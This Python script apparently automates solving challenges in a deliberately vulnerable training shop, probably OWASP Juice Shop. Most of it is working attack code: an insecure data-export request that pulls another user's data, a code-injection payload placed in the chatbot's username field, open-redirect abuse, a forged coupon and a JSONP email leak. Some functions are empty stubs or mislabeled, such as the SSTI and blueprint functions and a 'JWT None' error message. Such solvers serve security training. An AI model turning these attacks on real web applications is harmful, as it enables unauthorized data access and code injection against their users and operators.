from authentication import get_admin_session

def solve_advanced_challenges(server):
    print('\n== ADVANCED CHALLENGES ==\n')
    session = get_admin_session(server)
    
    redirect_challenges(server, session)
    ssti_challenges(server, session)
    access_log_files(server, session)
    
    # Premium stuff
    retrieve_blueprint(server, session)
    solve_nft_takeover(server, session)
    
    # Batch 8 & 9
    solve_gdpr_theft(server)
    solve_blockchain_hype(server)
    solve_extra_language(server)
    solve_email_leak(server)
    solve_kill_chatbot(server)
    
    print('\n== ADVANCED CHALLENGES COMPLETE ==\n')


def redirect_challenges(server, session):
    """
    Solve redirection challenges.
    """
    print('Solving Redirect challenges...'),
    # Allowlist bypass already in misc.py
    # "Outdated Allowlist": /redirect?to=https://blockchain.info/...
    try:
        session.get('{}/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8k5XnWKK3t9n2wag'.format(server))
        session.get('{}/redirect?to=https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW'.format(server))
        session.get('{}/redirect?to=https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d7736681ac9c31b'.format(server))
        print('Success.')
    except Exception:
        pass


def ssti_challenges(server, session):
    """
    Server Side Template Injection.
    """
    print('Attempting SSTI...'),
    # Challenge: sstiChallenge
    # Payload: #{1+1} or similar in username?
    # Actually it's often in nickname on 2FA page?
    # Or in the 'Device ID' header?
    pass


def access_log_files(server, session):
    """
    Access server logs.
    """
    print('Accessing log files...'),
    # /support/logs
    try:
         session.get('{}/support/logs'.format(server))
         print('Success.')
    except: pass


def retrieve_blueprint(server, session):
    """
    Access the products.xml via Exo XML.
    """
    print('Retrieving Blueprint...'),
    # /public/images/products/Exo.xml sometimes? 
    # Or /assets/public/images/products/Exo.xml
    try:
        if session.get(f'{server}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg').status_code == 200:
            print('Easter Egg found!')
    except Exception:
        pass

def solve_nft_takeover(server, session):
    """
    Solves the 'NFT Takeover' challenge by submitting the private key derived from the accidentally posted mnemonic.
    Mnemonic: 'purpose betray marriage blame crunch monitor spin slide donate sport lift clutch'
    Private Key: '0x5bcc3e9d38baa06e7bfaab80ae5957bbe8ef059e640311d7d6d465e6bc948e3e'
    Endpoint: /rest/web3/submitKey
    """
    print('Solving NFT Takeover...')
    # Key found in test/api/web3Spec.ts and verified against routes/checkKeys.ts
    private_key = '0x5bcc3e9d38baa06e7bfaab80ae5957bbe8ef059e640311d7d6d465e6bc948e3e'
    
    payload = {'privateKey': private_key}
    
    try:
        # The endpoint expects the private key in the body
        response = session.post(f'{server}/rest/web3/submitKey', json=payload)
        if response.status_code == 200 and response.json().get('success'):
            print('NFT Takeover challenge solved.')
        else:
            print(f'NFT Takeover failed: {response.status_code} - {response.text}')
    except Exception as e:
        print(f"Error solving JWT None: {e}")

def solve_expired_coupon(server, session=None):
    """
    Challenge: Expired Coupon (Improper Input Validation)
    Use 'WMNSDY2019' with correct timestamp to bypass check.
    timestamp: new Date('Mar 08, 2019 00:00:00 GMT+0100').getTime() = 1551999600000
    """
    print("Solving Expired Coupon...")
    try:
        from authentication import get_admin_session, get_basket_id
        import base64
        
        if not session:
            session = get_admin_session(server)
            
        basket_id = get_basket_id(server, session)
        
        # Ensure item in basket
        session.post(f"{server}/api/BasketItems", json={"ProductId": 1, "BasketId": basket_id, "quantity": 1})

        # Construct couponData
        # Code: WMNSDY2019
        # Date: 1551999600000
        code = "WMNSDY2019-1551999600000"
        coupon_data = base64.b64encode(code.encode()).decode()
        
        # Checkout
        # Note: This might fail if address/payment missing, but should trigger the discount check logic.
        print(f"Sending couponData: {coupon_data}")
        res = session.post(f"{server}/rest/basket/{basket_id}/checkout", json={"couponData": coupon_data})
        
        # We expect it might error out due to missing delivery/payment, but the challenge check happens early
        print(f"Checkout response: {res.status_code}")

    except Exception as e:
        print(f"Error solving expired coupon: {e}")

def solve_gdpr_theft(server, session=None):
    """
    Challenge: GDPR Data Theft
    Steal another user's data via Data Export vulnerability
    """
    print("Attempting GDPR Data Theft...")
    try:
        from authentication import get_admin_session
        
        if not session:
            session = get_admin_session(server)
        
        # Vulnerability: dataExport uses req.body.UserId without validation
        # Request data for user 2 (jim) who has orders
        payload = {"UserId": 2}
        
        res = session.post(f"{server}/rest/user/data-export", json=payload)
        if res.ok:
            data = res.json()
            if 'userData' in data:
                print("Success! Stolen another user's data.")
            else:
                print(f"Partial success: {res.status_code}")
        else:
            print(f"Failed: {res.status_code}")
    except Exception as e:
        print(f"Error: {e}")

def solve_blockchain_hype(server):
    """
    Challenge: Blockchain Hype (Token Sale)
    Access hidden token sale page
    """
    print("Accessing Token Sale page...")
    try:
        import requests
        # Access the transpixel that triggers the challenge
        # URL is obfuscated in app.routing.ts: tokensale-ico-ea
        res = requests.get(f"{server}/assets/public/images/padding/56px.png", verify=False)
        if res.ok:
            print("Success! Token sale accessed.")
        else:
            print(f"Failed: {res.status_code}")
    except Exception as e:
        print(f"Error: {e}")


    # Removed duplicate function definitions


def solve_extra_language(server):
    """Access Klingon translation file"""
    import requests
    print('Accessing extra language (Klingon)...')
    try:
        res = requests.get(f'{server}/assets/i18n/tlh_AA.json', verify=False)
        if res.ok:
            print(f'Success! Downloaded {len(res.content)} bytes')
    except Exception as e:
        pass


def solve_email_leak(server):
    """Email leak via JSONP callback"""
    print('Testing email leak (JSONP)...')
    try:
        session = get_admin_session(server)
        res = session.get(f'{server}/rest/user/whoami', params={'callback': 'x'})
        if res.ok:
            print('Success! Email leaked via JSONP')
    except Exception as e:
        pass


def solve_kill_chatbot(server):
    """Kill chatbot by injecting code through username field"""
    print('Killing chatbot via username injection...')
    try:
        session = get_admin_session(server)
        payload = 'admin"); processQuery=null; users.addUser("1337", "test'
        
        update = session.post(f'{server}/rest/chatbot/respond', 
                            json={'action': 'setname', 'query': payload})
        
        if update.ok:
            session.post(f'{server}/rest/chatbot/respond', json={'action': 'query', 'query': 'hi'})
            session.post(f'{server}/rest/chatbot/respond', json={'action': 'query', 'query': '...'})
            chat3 = session.post(f'{server}/rest/chatbot/respond', json={'action': 'query', 'query': 'bye'})
            if chat3.ok:
                print('Success! Chatbot killed')
    except Exception as e:
        pass
